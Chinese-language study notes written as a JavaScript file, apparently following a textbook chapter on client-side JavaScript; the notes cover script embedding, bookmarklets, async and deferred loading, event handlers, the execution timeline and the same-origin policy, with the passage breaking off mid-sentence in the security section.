/**
 * Web浏览器中的javascript
 * 
 * 在Web浏览器中，一些呈现静态信息的页面，叫做文档（document）。由于加入了JavaScript，静态页面的信息看上去会动来动去，但信息本身是静态的。
 * 对于文档来说，其他Web页面则感觉上更像是应用。如果需要的话，这些页面可以动态载入新的信息，因此看起来更加图形化，而非文本化，并且可与离线
 * 操作，以及保存数据到本地，以便再次访问时进行状态恢复。
 */



/**
 * 客户端javascript
 * 
 * 例13-1是onload事件处理程序的演示，并展示了客户端JavaScript的实例代码，包括查询文档元素、修改CSS类和定义事件处理程序。
 */

/**
 * Web文档里的JavaScript
 * 
 * JavaScript程序可以通过Document对象和它包含的Element对象遍历和管理文档内容。它可以通过操纵css样式和类，修改文档内容的呈现。并且可以通
 * 过注册适当的事件处理程序来定义文档元素的行为。内容、呈现和行为的组合，叫做动态HTML或DHTML。
 * 
 * Web文档里应当少量地使用JavaScript，因为JavaScript真正的角色是增强用户的浏览体验，是信息的获取和传递更容易。用户的体验不应依赖于
 * JavaScript，但JavaScript可以增强体验，比如通过下面的方式。
 * - 创建动画和其他视觉效果，巧妙地引导和帮助用户进行页面导航
 * - 对表格的列进行分组，让用户更容易找到所需要的。
 * - 隐藏某些内容，当用户“深入”到内容时，在逐渐展示详细信息。
 */

/**
 * Web应用里的JavaScript
 * 
 * 在Web文档中使用的JavaScript DHTML特性在Web应用中都会用到，对于Web应用来说，除了内容、呈现和操作API之外，还依赖了Web浏览器提供的更基
 * 础的服务。
 * 
 */



/**
 * 在HTML里嵌入JavaScript
 * 
 * 在HTML文档里嵌入客户端JavaScript代码有4种方法：
 * - 内联，放置在`<script>`和`</script>`标签对之间
 * - 放置在由`<script>`标签的src属性指定的外部文件中
 * - 放置在HTML事件处理程序中，该事件处理程序由onclick或onmouseover这样的HTML属性值指定
 * - 放在一个URL里，这个URL使用特殊的“javascript:”协议。
 * 
 * HTML事件处理程序属性和“javascript:” URL这两种方式在现代JavaScript代码里已经很少使用了。内联脚本（没有src属性）也比之前用的少了。
 * 
 * 有个编程哲学 “unobtrusive JavaScript”，主张内容（HTML）和行为（JavaScript代码）应该尽量保持分离。根据这个编程哲学，JavaScript
 * 最好通过`<script>`元素的src属性来嵌入HTML文档。
 * 
 * “Unobtrusive JavaScript”是一种将JavaScript从HTML结构中抽离的设计概念，避免在HTML标签中夹杂一堆onchange、onclick等属性去挂载
 * JavaScript事件，让HTML与JavaScript分离，依MVC的原则将功能全部区分清楚，使HTML也变得结构化容易阅读。
 */

/**
 * <script> 元素
 * 
 * JavaScript代码可以以内联的形式出现在HTML文件里的`<script>`和`</script>`标签之间：
 * <script>
 * // 这里是JavaScript代码
 * </script>
 * 
 * 在XHTML中，<script>标签中的内容被当做其他内容一样对待。如果JavaScript代码包含了“<”和“&”字符，那么这些字符就被解释成为XML标记。
 * 因此，如果要使用XHTML，最好把所有的JavaScript代码放入到一个CDATA部分里：
 * <script><![CDATA[
 * // 这里是JavaScript代码
 * ]]</script>
 * 
 * 例13-2展示了一个HTML文件，它包含简单的JavaScript程序。注释解释了这个程序是做什么的，但这个例子主要演示的是JavaScript代码以及
 * CSS样式表是如何嵌入HTML文件里。注意这个例子和例13-1的结构类似，并同样使用onload事件处理程序。
 */

/**
 * 外部文件中的脚本
 * 
 * <script>标签支持src脚本，这个属性指定包含JavaScript代码的文件的URL。用法如下：
 * <script src="../../scripts/utils.js"> </script>
 * 
 * JavaScript文件的扩展名通常是以.js结尾的。它包含纯粹的JavaScript代码，其中既没有<script>标签，也没有其他HTML标签。具有src属性
 * 的<script>标签的行为就像指定的JavaScript文件的内容直接出现在标签`<script>`和`</script>`之间一样。注意，即便指定了src属性并且
 * `<script>`和`</script>`标签之间没有JavaScript代码，结束的</script>标签也是不能丢的。在XHTML中，可以使用简短的<script/>标签。
 * 
 * 在使用src属性时，`<script>`和`</script>`标签之间任何内容都会忽略。如果需要，可以在<script>标签之间添加代码的补充说明文档或版
 * 权信息。但是要注意，如果有任何空格或JavaScript注释的文本出现在`<script src="">`和`</script>`标签之间，HTML5校验器将会报错。
 * 
 * 有时我们会看到诸如这种代码：
 * <script src="core.js">
 * config = {...}
 * </script>
 * 看起来这段代码定义了一些配置项，由core.js来读取，这是种将页面参数传入库文件的方法。在JavaScript库的开发中非常常见，其中<script>
 * 和</script>之间的代码是一段纯文本，在core.js执行的时候读取这段文本然后动态执行一次，浏览器不会自动执行<script>标签之间的代码。
 * 
 * 该方式的一些优点：
 * - 分离JavaScript代码，简化HTML文件
 * - 多HTML页面复用JavaScript代码
 * - 浏览器对于同一个js文件只下载一次并缓存，由多页面共享使用
 * - src属性的值可以是任意的URL，因此来自一个Web服务器的JavaScript程序或Web页面可以使用由另一个Web服务器输出的代码。
 *   很多互联网广告依赖于此
 * - 从其他网站载入脚本的能力，可以让我们更好地利用缓存。Google正在为通用的客户端类库推广标准且好记的URL，可以让浏览器只缓存一份
 *   副本，并且网络上的任意站点都可以使用。链接JavaScript代码到google服务器，可以减少Web页面的启动时间，因为这些类库可能已经存在
 *   于用户的浏览器缓存中，但你必须相信由第三方提供的代码服务，这对于你的站点来说很关键。
 * 
 * 从文档服务器之外的服务器里载入脚本有着重要的安全隐患。13.6.2节介绍的同源安全策略会阻止一个域的文档中的JavaScript和另一个域的
 * 内容进行交互。因此，同源策略并不适用于如下情况：即便代码和文档有着不同的来源，JavaScript代码也可以和它嵌入的文档进行交互。当
 * 在页面中用src属性包含一个脚本时，就给了脚本作者（以及从中载入这段脚本的域的网站管理员）完全控制Web页面的权限。
 */

/**
 * 脚本类型
 * 
 * JavaScript是Web的原始脚本语言，在默认情况下，假定<script>元素包含或引用JavaScript代码。如果要使用不标准的脚本语言，如Microsoft
 * 的VBScript（只有IE支持），就必须用type属性指定脚本的MIME类型：
 * <script type="text/vbscript">
 * // 这里是VBScript代码
 * </script>
 * 
 * type属性的默认值是“text/javascript”。如果需要，可以显式指定此类型，但完全没必要。老的浏览器可能会改用language属性替代type属性，
 * 这种情况也会经常看到：
 * <script language="javascript">
 * // 这里是JavaScript
 * </script>
 * language属性已经废弃，不应该使用。
 * 
 * 当Web浏览器遇到<script>元素，并且这个<script>元素包含其值不被浏览器识别的type属性时，它会解析这个元素但不会尝试显示或执行它的
 * 内容。这意味着可以使用<script>元素来嵌入任意的文本数据到文档里，只要用type属性为数据声明一个不可执行的类型。要获取数据，可以用
 * 表示script元素的HTMLElement对象的text属性。但是，要注意这些数据嵌入技术只对内联脚本生效。如果同时指定src属性和一个未知的类型，
 * 那这个脚本会被忽略，并且不会从指定的URL里下载任何内容。
 */

/**
 * HTML中的事件处理程序
 * 
 * 当脚本所在的HTML文件被载入浏览器时，这个脚本里的JavaScript代码只会制定一次。为了可交互，JavaScript程序必须定义事件处理程序 ——
 * Web浏览器先注册JavaScript函数，并在之后调用它作为事件的响应（比如用户输入）。
 * 
 * 类似onclick的事件处理程序属性，用相同的名字对应到HTML属性，并且可以通过将JavaScript代码放置在HTML属性里定义事件处理程序。例如，
 * 要定义用户切换表单中的复选框时调用的事件处理程序，可以作为表示复选框的HTML元素的属性指定处理程序代码：
 * <input type="checkbox" name="options" value="giftwrap"
 *        onchange="order.options.giftwrap = this.checked;">
 * 这里的onchange属性比较有意思。这个属性值里的JavaScript代码会在用户选择或取消选择复选框时执行。
 * 
 * HTML中定义的事件处理程序的属性可以包含任意条JavaScript语句，相互之间用逗号分隔。这些语句组成一个函数题，然后这个函数成为对应
 * 事件处理程序属性的值。但是，通常HTML事件处理程序的属性由类似上面的简单赋值或定义在其它地方的简单函数调用组成。这样可以保持大部分
 * 实际的JavaScript代码在脚本里，而不用把JavaScript和HTML混在一起。
 */

/**
 * URL中的JavaScript
 * 
 * 在URL后面跟一个“javascript:”协议限定符，是另一种嵌入JavaScript代码到客户端的方式。这种特殊的协议类型指定URL内容为任意字符串，
 * 这个字符串是会被JavaScript解释器运行的JavaScript代码。它被当做单独的一行代码对待，这意味着语句之间必须用分号隔开，而“//”注释
 * 必须用“/ * * /”注释代替。
 * 
 * “javascript: URL”能识别的“资源”是转换成字符串的执行代码的返回值。如果代码返回undefined，那么这个资源就是没有内容的。
 * 
 * “javascript: URL”可以用在可以使用常规URL的任意地方：比如`<a>`标记的href属性，`<form>`的action属性，甚至window.open()方法的
 * 参数。超链接里的JavaScript URL可以是这样的：
 * 
 * <a href="javascript:new Date().toLocaleTimeString();">
 * What time is it?
 * </a>
 * （代码的返回值会覆盖当前文档）
 * 
 * 部分浏览器（比如firefox）会执行URL里的代码，并使用返回的字符串作为待显示新文档的内容。就像单击一个http: URL 链接，浏览器会擦除
 * 当前文档并显示新文档。以上代码的返回值并不包含任何HTML标签，但是如果有，浏览器会像渲染通常载入的等价HTML文档一样渲染它们。其他浏览
 * 器（比如Chrome和safari）不允许URL像上面一样覆盖当前文档，它们会忽略代码的返回值。但是，类似这样的URL还是会支持的：
 * 
 * <a href="javascript:alert(new Date().toLocaleTimeString());">
 * 检查时间，而不必覆盖整个文档
 * </a>
 * 
 * 当浏览器载入这种类型的URL时，它会执行JavaScript代码，但是由于没有返回值（alert()方法返回undefined）作为新文档的显示内容，类似
 * Firefox的浏览器并不会替代当前显示的文档。（在这种情况下，javascript: URL和onclick事件处理程序的目的一样。上面的链接通过
 * <button>元素的onclick处理程序来表示会更好，因为<a>元素通常为超链接，用来载入新文档。） 
 * 
 * 如果要确保“javascript: URL”不会覆盖当前文档，可以用void操作符强制函数调用（忽略计算值）或给表达式赋予undefined的值：
 * 
 * <a href="javascript:void window.open('about:blank');">
 * 打开一个窗口
 * </a>
 * 
 * 如果这个URL里没有void操作符，调用window.open()方法返回的值会（在一些浏览器里）被转化为字符串并显示，而当前文档也会被覆盖为包含
 * 该字符串的文档：
 * [object Window]
 * 
 * JavaScript URL是Web早期的遗物，通常应该避免在现代HTML里使用。但“javascript: URL”在HTML文档之外确实有着重要的角色。如果要测试
 * 一小段JavaScript代码，那么可以在浏览器地址栏里直接输入“javascript: URL”。
 */

/**
 * “javascript: URL”另一个正统（且强大）的用法：浏览器书签。
 * 
 * 在Web浏览器中，“书签”就是一个保存起来的URL。如果书签是“javascript: URL”的形式，那么保存的就是一小段脚本，叫做“bookmarklet”。
 * “bookmarklet”是一个小型的程序，很容易就可以从浏览器的菜单或工具栏里启动。“bookmarklet”里的代码执行起来就像页面上的脚本一样，
 * 可以查询或设置文档的内容、呈现和行为。只要书签不返回值，它就可以操作当前显示的任何文档，而不把文档替换为新的内容。
 * 
 * 注意，即便这个“javascript: URL”是写成多行的，HTML解析器仍将它作为单独的一行对待，并且其中的单行“//”注释是无效的。还有要记住，
 * 如果代码是单引号中的HTML属性的一部分，所以代码也不可以包含任何单引号。如果是双引号，则代码不可包含双引号。
 * 
 * 考虑下面`<a>`标签里的“javascript: URL”。单击链接会打开一个简单的JavaScript表达式计算器，它允许在页面环境中计算表达式和执行语句。
 * 在开发时，把这样的链接硬编码在页面中是有用的；而把它另存为可以在任何页面上运行的书签，就更有用了。通常，在浏览器里把超链接的地址
 * 加入书签可以这样做，在链接上右击并选择类似“Bookmark Link”的选项，或者拖动链接到书签工具栏。
 */
<a href='javascript:
  var e="",r="";   /*需要计算的表达式和结果*/
  do{
    /*输出表达式和结果，并要求输入新的表达式*/
    e=prompt("expression: "+e+"\n"+r+"\n",e);
    try{r="result: "+eval(e);} /*尝试计算这个表达式*/
    catch(ex){r=ex;}   /*否则记住这个错误*/
  }while(e);   /*知道没有输入表达式或者单击取消按钮才会停止，否则一直执行*/
  void 0;   /*防止当前文档被覆盖*/
'>
javascript evaluator
</a>



/**
 * JavaScript程序的执行
 * 
 * 客户端JavaScript程序没有严格的定义。我们可以说JavaScript程序是由Web页面中所包含的所有JavaScript代码（内联脚本、HTML事件处理程序和javascript: URL）
 * 和通过`<script>`标签的src属性引用的外部JavaScript代码组成。所有这些单独的代码共用同一个全局window对象。这意味着它们可以看到相同的Document对象，可以
 * 共享相同的全局函数和变量的集合：如果一个脚本定义了新的全局变量或函数，那么这个变量或函数会在脚本执行之后对任意JavaScript代码可见。
 * 
 * - 嵌入的窗体
 * 如果Web页面中包含一个嵌入的窗体（通常使用`<iframe>`元素），嵌入的文档中的JavaScript代码和被嵌入文档里的JavaScript代码有不同全局对象，它可以当作一个
 * 一个单独的JavaScript程序。但是，要记住，没有严格的关于JavaScript程序范围的定义。如果外面和里面的文档来自于同一个服务器，那么那两个文档中的代码就可以
 * 进行交互，并且如果你愿意，就可以把它们当做是同一个程序的两个互相作用的部分。14.8.3节会详细介绍全局Window对象以及不同窗口和窗体之间的交互。
 * 
 * - bookmarklet里的javascript
 * bookmarklet里的javascript: URL存在于文档之外，可以想象成是一种用户扩展或者对于其它程序的修改。当用户执行一个bookmarklet时，书签里的JavaScript代码
 * 就可以访问全局对象和当前文档的内容，以及对它进行操作。（当bookmarklet里的js代码中调用当前文档中不存在的变量时，调用不会成功）
 * 
 * JavaScript程序的执行有两个阶段：
 * 1. 第一阶段，载入文档内容，并执行`<script>`元素里的代码（包括内联脚本和外部脚本）。脚本通常会按它们在文档里的出现顺序执行。所有脚本里的JavaScript代码
 *    自上而下，按照它在条件、循环以及其它控制语句中的出现顺序执行。
 * 2. 第二阶段，此时文档载入完成，并且所有脚本执行完成。这个阶段是异步的，而且由事件驱动。在事件驱动阶段，Web浏览器调用事件处理程序函数（由第一阶段里执行
 *    的脚本指定的HTML事件处理程序，或之前调用的事件处理程序来定义），来响应异步发生的事件。调用事件处理程序通常是响应用户输入（如鼠标点击，键盘按下等）。
 *    但是，还可以由网络活动、运行时间或者JavaScript代码中的错误来触发。注意，嵌入Web页面里的javascript: URL也可以被当作是一种事件处理程序，因为知道用户
 *    通过点击链接或提交表单来激活之后它们才会有效果。
 * 
 * 事件驱动阶段里的第一个事件：load事件。
 * 该事件指示文档已经完全载入，并可以操作。JavaScript程序经常用这个事件来触发或发送消息。我们会经常看到一些定义函数的脚本程序，除了定义一个onload事件处理
 * 程序函数外不做其它操作，这个函数会在脚本事件驱动阶段开始时被load事件触发。
 * JavaScript程序的载入阶段是相对短暂的，通常只有1~2s。在文档载入完成后，只要Web浏览器显示文档，事件驱动阶段就会一直持续下去。因为这个阶段是异步的和事件
 * 驱动的，所以可能很长时间处于不活动状态，没有JavaScript被执行，被用户或网络事件触发的活动打断。
 * 
 * 核心JavaScript和客户端JavaScript都有一个单线程执行模型。脚本和事件处理程序（无论如何）会在同一时间只能执行一个，没有并发性。这保持了JavaScript编程的
 * 简单性。
 */

/**
 * 同步、异步和延迟的脚本
 * 
 * JavaScript第一次添加到Web浏览器时，还没有API可以用来遍历和操作文档的结构和内容。当文档还在载入时，JavaScript影响文档内容的唯一办法是快速生成内容。它
 * 使用document.write()方法完成任务。
 * 
 * 例13-3展示了1996年最先进的JavaScript代码的样子。
 * 
 * 当脚本把文本传递给document.write()时，这个文本被添加到文档输入流中，HMTL解析器会在当前位置创建一个文本节点，将文本插入这个文本节点后面。我们并不推荐
 * 使用document.write()，但在某些场景下它有着重要的用途。
 * 当HTML解析器遇到`<script>`元素时，它默认必须先执行脚本，然后再恢复文档的解析和渲染。这对内联脚本没什么问题，但如果脚本源代码是一个由src属性指定的外部
 * 文件，这意味着脚本后面的文档部分在下载和执行脚本之前，都不会出现在浏览器中。（译注：作者在这里的表述很模糊，所谓“不会出现在浏览器中”是指文档的文本内容
 * 已经载入，但是并未被浏览器引擎解析为DOM树，而DOM树的生成是受JavaScript代码执行影响的，JavaScript代码会“阻塞”页面UI的渲染。）
 * 
 * 脚本的执行旨在默认的情况下是同步和阻塞的。`<script>`标签可以有defer和async属性，这（在支持它们的浏览器里）可以改变脚本的执行方式。这些都是布尔属性，
 * 没有值：只需要出现在`<script>`标签里即可。HTML5说这些属性只有在和src属性结合使用时才会生效，但有些浏览器还支持延迟的内联脚本：
 * - 推迟
 *   <script defer src="deferred.js"></script>
 * - 异步
 *   <script async src="async.js"></script>
 * 
 * defer和async属性都像在告诉浏览器链接进行来的脚本不会使用document.write()，也不会生成文档内容，因此浏览器可以在下载脚本时继续解析和渲染文档。
 * - defer属性使得浏览器延迟脚本的执行，直到文档的载入和解析完成，并可以操作。
 * - async属性使得浏览器可以尽快执行脚本，而不用在下载脚本时阻塞文档解析。如果`<script>`标签同时有两个属性，同时支持两者的浏览器会遵从async属性并忽略defer。
 * 
 * 注意，延迟的脚本会按它们在文档里的出现顺序执行。而异步脚本在它们载入之后执行，这意味着它们可能无序执行。
 * 
 * 甚至可以在不支持async属性的浏览器里，通过动态地创建`<script>`元素并把它插入到文档中，来实现脚本的异步载入和执行。
 * 例13-4里的loadasync()函数完成了这个工作。
 */
// 用来计算阶乘的函数
function factorial(n){
    if (n<=1) return n;
    return n*factorial(n-1)
}

// 开始创建HTML表
document.write("<table>");
document.write("<tr><th>n</th><th>n!</th></tr>");
for (var i=1;i<=10;i++){
    document.write("<tr><td>" +i+ "</td><td>" +factorial(i)+ "</td></tr>");
}
document.write("</table>");
// 输出时间戳
document.write("Generated at " +new Date());

// 异步载入并执行一个指定 URL 中的脚本
function loadasync(url){
    // 找到head元素
    var head = document.getElementsByTagName("head")[0];
    // 创建一个script元素
    var s = document.createElement("script");
    // 设置src属性
    s.src = url;
    // 将script元素插入到<head>标签中
    head.appendChild(s);
}

/**
 * 事件驱动的JavaScript
 * 
 * 通过注册事件处理程序函数来写程序。之后，在注册的事件发生时异步调用这些函数。什么事件？例如为常用操作启用键盘快捷键的Web应用会为键盘事件注册事件处理程序。甚至
 * 非交互的程序也使用事件。假如想写一个文档结构并自动生成文档内容的表格的程序。程序不需要用户输入事件的事件处理程序，但它还是会注册onload事件处理程序。
 * 
 * 事件都有名字，比如click、change、load、mouseover、keypress或readystatechange，
 * 指示发生的事件的通用类型。事件还有目标，它是一个对象，并且事件就是它上面发生的。当我们讨论事件的时候，必须同时指定事件类型（名字）和目标；比如，一个单击事件发
 * 生在HTMLButtonElement对象上，或者一个readystatechange事件发生在XMLHttpRequest对像上。
 * 如果想要程序响应一个事件，写一个函数，叫做“事件处理程序”、“事件监听器”或“回调”。然后注册这个函数，这样他就会在事件发生时调用它。不推荐通过HTML属性来完成，即
 * 为了不讲JavaScript代码和HTML内容混淆在一起。反之，注册事件处理程序最简单的方法是把JavaScript函数赋值给目标对象的属性。
 * 
 * window.onload = function (){};
 * document.getElementById("button1").onclick = function (){};
 * function handleResponse(){};
 * request.onreadystatechange = handlResponse;
 * 
 * 注意，按照约定，事件处理程序的属性名字是以“on”开始，后面跟着事件的名字。还要注意在上面的代码中里没有任何函数调用：只把函数本身赋值给这些属性。浏览器会在事件
 * 发生时执行调用。用事件进行异步编程会经常涉及嵌套函数，也经常要在函数的函数里定义函数。
 * 
 * 对于大部分浏览器中的大部分事件来说，会把一个对象传递给事件处理程序作为参数，那个对象的属性提供了事件的详细信息。比如，传递给单击事件的对象，会有一个属性说明
 * 鼠标的哪个按钮被单击。（在IE里，这些事件信息被存储在全局event对象里，而不是传递给处理程序函数。）事件处理程序的返回值有时用来指示函数是否充分处理事件，以及
 * 阻止浏览器执行它默认会进行的各种操作。
 * 
 * 有些事件的目标是文档元素，它们经常会往上传递给文档树，这个过程叫做“冒泡”。例如，如果用户在button元素上单击鼠标，单击事件就会在按钮上触发。如果注册在按钮上的
 * 函数没有处理（并且冒泡停止）该事件，事件将会冒泡到按钮嵌套的容器元素，这样，任何注册在容器元素上的单击事件都会调用。
 * 
 * 如果需要为一个事件注册多个事件处理程序函数，或者如果想要写一个可以安全注册事件处理程序的代码模块，就算另一个模块已经为相同的目标上的相同的事件注册一个处理程序，
 * 也需要用另一种事件处理程序注册技术。大部分可以成为事件目标的对象都有一个addEventListener()的方法，允许注册多个监听器。
 * 
 * window.addEventListener("load", function(){}, false);
 * request.addEventListener("readystatechange", function(){}, false);
 * 
 * 注意这个函数的第一个参数是事件的名称。微软只在IE9里实现了它。在IE8以及之前的浏览器中，必须使用一个相似的方法，叫做attachEvent()。
 * 
 * window.attachEvent("onload", function(){});
 * 
 * 客户端JavaScript程序还使用异步通知类型，这些类型往往不是事件，不要通过点击鼠标或其它操作触发。如果设置Window.onerror属性为一个函数，会在发生JavaScript错误
 * （或其他未捕获的异常）时调用函数。还有，setTimeout()和setInterval()函数（这些是Window对象的方法，因此是客户端JavaScript的全局函数）会在指定的一段时间之后
 * 出发指定的函数调用。传递给setTimeout()的函数和真实事件处理程序的注册不同，它们通常叫做“回调逻辑”而不是“处理程序”，但它们和事件处理程序一样，是异步的。
 * 
 * 例13-5 onLoad()，当文档载入完成时调用一个函数
 */
// 注册函数f，当文档载入完成时执行这个函数f
// 如果文档已经载入完成，尽快异步方式执行它
function onLoad(f){
    if (onLoad.loaded){                // 如果文档已经载入完成
        window.setTimeout(f, 0);       // 将f放入异步队列，并尽快执行它
    }else if(window.addEventListener){ // 注册事件的标准方法
        window.addEventListener("load", f, false);
    }else if(window.attachEvent){      // IE8以及更早的IE版本浏览器注册事件的方法
        window.attachEvent("onload", f);
    }
}
// 给onLoad设置一个标志，用来指示文档是否载入完成
onLoad.loaded = false;
// 注册一个函数，当文档载入完成时设置这个标志
onLoad(function(){ onLoad.loaded = true; });

/**
 * 客户端JavaScript线程模型
 */

/**
 * 客户端JavaScript时间线
 * 
 * （解析document开始）
 * 1. Web浏览器创建document对象，并且开始解析Web页面，解析HTML元素和它们的文本内容后添加Element对象和Text节点到文档中。
 *    该阶段document.readyState属性的值为“loading”。
 * （遇到script，且无async和defer）
 * 2. 当HTML解析器遇到没有 async 和 defer 属性的`<script>`标签时，它把这些元素添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且
 *    在脚本下载（如果需要）和执行时解析器会暂停。这样脚本就可以用document.write()来把文本插入到输入流中。解析器恢复时这些文本会成为文档的一部
 *    分。同步脚本经常简单定义函数和注册后面使用的注册事件处理程序，但它们可以遍历和操作文档树，因为在它们执行时已经存在了。这样，同步脚本可以
 *    看到它自己的script元素和它们之前的文档内容。
 * （遇到script，且有async）
 * 3. 当解析器遇到设置了async属性的`<script>`标签时，它开始下载脚本文件，并继续解析文档。脚本会在它下载完成后尽快执行，但是解析器没有停下来等
 *    待它下载。异步脚本禁止使用document.write()方法。（解析完成后，会重写文档内容）它们可以看到自己的script元素和它之前的所有文档元素，并且
 *    可能或干脆不可能访问其他的文档内容。
 * （解析document完成）
 * 4. 当文档完成解析。
 *    该阶段document.readyState属性的值为“interactive”。
 *
 * 5. 所有defer属性的脚本，会按它们在文档里的出现顺序执行。异步脚本可能也会在这个时间执行。延迟脚本能访问完整的文档树，禁止使用document.write()
 *    方法。（覆盖解析完成后的document内容）
 * 6. 浏览器在Document对象上触发DOMContentLoaded事件。这标志着程序执行从同步脚本执行阶段转换到了异步事件驱动阶段。但要注意，这时可能可能还有
 *    异步脚本没有执行完成。
 * 7. 这时，文档已经完全解析完成，但是浏览器可能还在等待其它内容载入，如图片。当所有这些内容完成载入时，并且所有异步脚本完成载入和执行，
 *    document.readyState属性的值为“complete”，Web浏览器触发Window对象上的load事件。
 * 8. 从此刻起，会调用异步事件，以异步响应用户输入事件、网络事件、计时器过期等。
 * 
 * 这是一条理想的时间线，但是所有浏览器都没有支持它的全部细节。所有浏览器普遍都支持load事件，都会触发它，它是决定文档完全载入并可以操作最通用的
 * 技术。DOMContentLoaded事件在load事件之前触发，当前所有浏览器都支持这个事件。
 * 
 * 这条时间线没有指定什么时候文档开始对用户可见或什么时候Web浏览器必须开始响应用户输入事件。这些是实现细节。对于很长的文档或非常慢的网络链接，Web
 * 浏览器理论上会渲染一部分文档，并且在所有脚本执行之前，就能允许用户开始和页面产生一些交互。这种情况下，用户输入事件可能在程序执行事件驱动阶段开始
 * 之前触发。
 */



/**
 * 兼容性和互用性
 * 
 * Web浏览器是Web引用的操作系统，但是Web是一个存在各种差异性的环境，Web文档和应用会在不同操作系统（Windows、Mac OS、Linux、iPhone OS、Android）
 * 的不同开发商（Microsoft、Mozilla、Apple、Google、Opera）的不同时代的浏览器（从预览版的浏览器到类似IE6这种十多年之前的浏览器）上查看和运行。写
 * 一个健壮的客户端JavaScript程序并能正确地在这么多类型的平台上，的确是一种挑战。
 * 
 * 客户端JavaScript兼容性和交互性的问题可以归纳为以下三类：
 * - 演化
 *   Web平台一直在演变和发展中。一个标准规范会提倡一个新的特性和API。如果特性看起来有用，浏览器开发商来实现它。如果足够多的开发商实现它，开发者开始
 *   使用这个特性，并依赖这个特性，然后这个特性在Web平台中广泛使用。有时候浏览器开发商和Web开发者引领这种标准规范的指定，开发好官方的版本，之前特性
 *   已经成为一个事实的标准。另一种情况，新特性已经被添加到Web中，新浏览器支持它，但是老浏览器不支持。Web开发者必须在使用老旧浏览器的大量用户和使用
 *   新浏览器的少量用户之间做出权衡。
 * - 未实现
 *   有时候，浏览器开发商之间对于某一个特性是否足够有用到要实现存在观点上的差异。一些开发商实现了这个特性，而其它的没有实现。有些现代浏览器实现的功能
 *   在老旧浏览器中没有实现，这种情况还好，但同样实现一个功能在不同浏览器中有很大差别，例如，IE8不支持`<canvas>`标签，虽然其它浏览器已经实现了它。一
 *   个更糟糕的例子是，Microsoft决定不实现DOM level 2 Event规范（它定义了addEventListener()和相关的方法）。这个规范在十年之前已经标准化了，其他
 *   浏览器厂商已经支持了很久了。
 * - Bug
 *   每个浏览器都有bug，并且没有按照规范准确地实现所有客户端JavaScript API。有时候编写能兼容各个浏览器的JavaScript程序是一个糟透了的工作，必须研究
 *   已有浏览器中的各种bug。
 * 
 * 辛运的是，JavaScript语言本身是被所有浏览器厂商实现的，它不是兼容性问题的源头。所有浏览器都有对ES3的通用实现，并且在写本书的时候，所有厂商都实现了
 * ES5。ES3和ES5之间的转换可能导致兼容性问题，因为一些浏览器会支持严格模式而其它的不支持，浏览器厂商对ES5的实现基本是相互通用的。
 * 
 * 首先，要解决的JavaScript的兼容性问题是要了解问题的根源是什么。Web浏览器版本的更迭要比本书的版本快三倍多，因此本书没办法告诉你什么版本的浏览器实现
 * 了哪些特性，或者不会过多讨论哪些特性在某些浏览器下的表现如何或其中的bug。这些比较具体的信息最好直接去网上查找。HTML5标准化的努力的目标是最终产生一
 * 个测试套件。当下一些网站提供了这种信息，可能对你有用。
 * 
 * https://developer.mozilla.org
 * Mozilla开发者中心
 * 
 * http://msdn.microsoft.com
 * Microsoft开发者网络
 * 
 * http://developer.apple.com/safari
 * Apple开发者网络里的Safari开发者中心
 * 
 * http://code.google.com/doctype
 * Google把Doctype项目介绍为“开放Web的一本百科全书”。这个用户可以编辑的站点包含客户端JavaScript的各种兼容性表格。在写本书时，这些表格只报告了
 * 每个浏览器里是否存在各种属性和方法，而事实上没有说它们是否正常工作。
 * 
 * http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(HTML_5)
 * Wikipedia文章跟踪了HTML5特性和API在各个浏览器里的实现状态
 * 
 * http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(Document_Object_Model)
 * 一个简单的文章，跟踪DOM特性的实现状态
 * 
 * http://a.deveria.com/caniuse / https://caniuse.com/
 * 这个“何时可用······”站点跟踪了重要Web特性的实现状态，允许根据各种标准进行过滤，并在某个特性只剩下少量已部署的浏览器不支持时推荐使用。
 * 
 * http://www.quirksmode.org/dom
 * 根据W3C标准列出的各种浏览器的DOM兼容性表格
 * 
 * http://webdevout.net/browser-support
 * 另一个跟踪浏览器开发商对于Web标准的实现的站点
 * 
 * 注意，列表的最后三个站点是由个人维护的。尽管它们是客户端JavaScript的先行者，但这些站点可能不总是保持最新。
 */

/**
 * 处理兼容性问题的类库
 * 
 * jQuery
 */

/**
 * 分级浏览器支持
 * 
 */

/**
 * 功能测试
 * 
 */

/**
 * 怪异模式和标准模式
 */

/**
 * 浏览器测试
 */

/**
 * internet explorer里的条件注释
 */




/**
 * 可访问性
 */



/**
 * 安全性
 *
 * Web浏览器中包含JavaScript解释器，也就是说，一旦载入Web页面，就可以让任意的JavaScript代码在计算机里执行。很明显，这里存在安全隐患，浏览器
 * 厂商在不断地权衡下面这两个方面之间的博弈：
 * - 定义强大的客户端API，启用强大的Web应用
 * - 阻止恶意代码读取或修改数据、盗取隐私、诈骗或浪费时间
 */

/**
 * JavaScript不能做什么
 * 
 * Web浏览器针对恶意代码的第一条防线就是它们不支持某些功能。
 * 
 * 浏览器针对恶意代码的第二条防线就是在自己支持的某些功能上施加限制。
 */

/**
 * 同源策略
 * 
 * 同源策略是对JavaScript代码能够操作哪些Web内容的一条完整的安全限制。当Web页面使用多个`<iframe>`标签或者打开其他浏览器窗口的时候，这一策略
 * 通常就会发挥作用。在这种情况下，同源策略负责管理窗口或窗体中的JavaScript代码以及和其他窗口或帧的交互。具体来讲，脚本只能读取和所属文档来源
 * 相同的窗口和文档的属性。（参考14.8节了解如何使用JavaScript操控多个窗口和窗体）
 * 
 * 文档的来源包含协议、主机，以及载入文档的URL端口。从不同Web服务器载入的文档具有不同来源。通过同一主机的不同端口载入的文档具有不同的来源。使用
 * http: 协议载入的文档和使用https: 协议载入的文档具有不同的来源，即使它们来自同一个服务器。
 * 
 * 脚本本身的来源和同源策略并不相关，相关的是脚本所嵌入的文档的来源，理解这一点很重要。例如，假设一个来自主机A的脚本被包含到（使用script元素的
 * src属性）宿主B的一个Web页面中。这个脚本来源是主机B，并且可以完整地访问包含它的文档的内容。如果脚本打开一个新窗口并载入来自主机B的另一个文档，
 * 脚本对这个文档的内容也具有完全的访问权限。但是，如果脚本打开第三个窗口并载入一个来自主机C的文档（或来自主机A），同源策略就会发挥作用，阻止脚
 * 本访问这个文档。（新建窗口打开文档、通过建立http客户端访问文档）
 * 
 * 实际上，同源策略并非应用于不同源的窗口中的所有对象的所有属性。不过它应用到了其中大多数属性，尤其是对Document对象的几乎所有属性而言。凡是包含
